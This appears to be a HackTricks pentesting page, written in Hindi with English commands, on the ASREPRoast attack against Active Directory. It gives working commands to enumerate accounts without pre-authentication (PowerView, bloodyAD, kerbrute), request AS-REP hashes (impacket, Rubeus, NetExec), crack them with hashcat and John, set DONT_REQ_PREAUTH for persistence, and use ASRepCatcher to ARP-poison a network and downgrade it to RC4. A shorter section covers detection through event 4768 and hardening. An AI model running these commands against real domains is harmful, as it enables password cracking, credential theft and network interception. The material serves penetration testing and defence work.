# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक security attack है, जो उन users का फायदा उठाता है जिनमें **Kerberos pre-authentication required attribute** नहीं होता। मूल रूप से, यह vulnerability attackers को user's password की आवश्यकता के बिना Domain Controller (DC) से किसी user के लिए authentication request करने की अनुमति देती है। इसके बाद DC user's password-derived key से encrypted एक message भेजता है, जिसे attackers offline crack करके user's password पता करने का प्रयास कर सकते हैं।

इस attack के लिए मुख्य requirements हैं:

- **Lack of Kerberos pre-authentication**: Target users के लिए यह security feature enabled नहीं होना चाहिए।
- **Connection to the Domain Controller (DC)**: Attackers को requests भेजने और encrypted messages प्राप्त करने के लिए DC तक access की आवश्यकता होती है।
- **Optional domain account**: Domain account होने पर attackers LDAP queries के माध्यम से vulnerable users की अधिक कुशलता से पहचान कर सकते हैं। ऐसे account के बिना attackers को usernames guess करने पड़ते हैं।

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP message का अनुरोध
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus डिफ़ॉल्ट रूप से **RC4** का अनुरोध करता है, इसलिए Event ID **4768** में आमतौर पर **preauth type 0** और **ticket encryption type 0x17** दिखाई देता है। यदि आप **`/aes`** जोड़ते हैं (या target के लिए RC4 disabled है), तो इसके बजाय **AES etypes** की अपेक्षा करें।<sup>[[2]](#references)</sup>

#### Quick one-liners (Linux)

- पहले potential targets enumerate करें (जैसे, leaked build paths से) और Kerberos userenum का उपयोग करें: `kerbrute userenum users.txt -d domain --dc dc.domain`
- NetExec का उपयोग करके valid creds के बिना पूरी username list को roast करें: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- यदि आपके पास creds हैं, तो NetExec को LDAP query करने दें और आपके लिए हर roastable account का अनुरोध करें: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- यदि output **`$krb5asrep$23$`** से शुरू होता है, तो इसे Hashcat **`-m 18200`** से crack करें। यदि यह **`$krb5asrep$17$`** या **`$krb5asrep$18$`** से शुरू होता है, तो John **`--format=krb5asrep`** को प्राथमिकता दें।<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

यह न मानें कि हर AS-REP roast RC4 है। Modern tooling अनुरोधित/negotiated enctype के आधार पर **RC4** (`$krb5asrep$23$`) या **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) लौटा सकती है। **`hashcat -m 18200`** **etype 23** के लिए है, जबकि **John** `krb5asrep` को **17/18/23** के लिए सीधे handle करता है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

उस user के लिए **preauth** को required न होने पर force करें, जिसके लिए आपके पास **GenericAll** permissions (या properties लिखने की permissions) हों:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Detection और hardening

एक सफल roast DC पर `Status=0x0` और `PreAuthType=0` के साथ **4768** event उत्पन्न करता है। Detection में RC4 को आवश्यक न बनाएं: `TicketEncryptionType=0x17` weak-encryption का उपयोगी संकेत है, लेकिन attacker AES का अनुरोध कर सकता है (event-log values `0x11`/`0x12`)। Windows Server 2016 और उसके बाद के versions में, 14 जनवरी 2025 (या नए) cumulative update के साथ, event 4768 का version 2 अब `ClientAdvertizedEncryptionTypes`, account/DC द्वारा समर्थित etypes और उपलब्ध keys भी दिखाता है।<sup>[[5]](#references)</sup>

एक practical hunt ऐसे client को flag करता है जो केवल RC4 advertise करता है जबकि account के पास AES keys हैं, फिर एक ही source IP से कई no-preauth users के विरुद्ध होने वाले bursts को correlate करता है। हर `PreAuthType=0` event पर alert करने के बजाय legitimate exceptions का baseline बनाएं।

Durable fix यह है कि उन सभी users पर **Do not require Kerberos preauthentication** को clear करें जिन्हें इसकी सख्त आवश्यकता नहीं है और exposed account passwords को rotate करें। यदि कोई exception हटाया नहीं जा सकता, तो लंबा randomly generated password और minimal privileges उपयोग करें। RC4 को disable करने से cracking cost बढ़ती है, लेकिन roastability समाप्त नहीं होती क्योंकि AES AS-REP responses को अब भी offline crack किया जा सकता है।<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast बिना credentials

एक on-path attacker सामान्य, preauthenticated AS exchange के दौरान लौटाए गए AS-REP को capture कर सकता है और उसके encrypted part को offline cracking के लिए format कर सकता है। Classic ASREPRoasting के विपरीत, इसके लिए `DONT_REQ_PREAUTH` आवश्यक नहीं है; हालांकि, इससे केवल वे accounts प्राप्त होते हैं जिनका Kerberos exchange वास्तव में intercept किया गया हो। **ASRepCatcher** default रूप से one-way ARP poisoning द्वारा position प्राप्त करता है, या `--disable-spoofing` के साथ किसी अन्य MitM technique से प्राप्त traffic को consume कर सकता है।<sup>[[6]](#references)</sup>\
यदि आप उस संबंधित no-credential trick को देखना चाहते हैं जो no-preauth principal से **TGT** के बजाय **service ticket** लौटाती है, तो [Kerberoast](kerberoast.md) देखें।

`relay` mode में, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) intercepted AS-REQs को forward करता है और दोनों sides द्वारा अब भी अनुमति दिए जाने पर **RC4** को force करता है। `listen` packets को alter नहीं करता और इसलिए client तथा DC द्वारा negotiated किसी भी enctype को capture करता है। जब संभव हो, पूरे subnet को प्रभावित करने के बजाय `-t`/`-tf` के साथ poisoning का scope निर्धारित करें।<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [AES AS-REPs को Roasting करना – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Event 4768: Kerberos authentication ticket का अनुरोध किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
